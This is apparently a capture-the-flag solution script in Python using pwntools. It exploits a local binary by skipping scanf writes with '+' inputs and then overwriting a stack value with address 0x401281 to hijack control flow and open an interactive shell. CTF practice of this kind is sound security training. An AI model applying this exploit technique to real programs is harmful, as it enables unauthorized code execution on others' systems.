from pwn import *
#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'amd64', os = 'linux')
p = process('./Bu_Si_Yi_nasukiyanhu')
#p = remote("10.252.113.234",4723)
elf = ELF('./Bu_Si_Yi_nasukiyanhu')
#libc = ELF('./libc.so.6')

for _ in range(10):
    p.recvuntil('わたし、気になります！')
    p.sendline(b'+')

p.recvuntil('わたし、気になります！')
p.sendline(str(0x401281))
p.recvuntil('わたし、気になります！')
p.sendline(str(0))

for _ in range(4):
    p.recvuntil('わたし、気になります！')
    p.sendline(b'+')

p.interactive()
#用+即可跳过一个scanf，保持原数据不变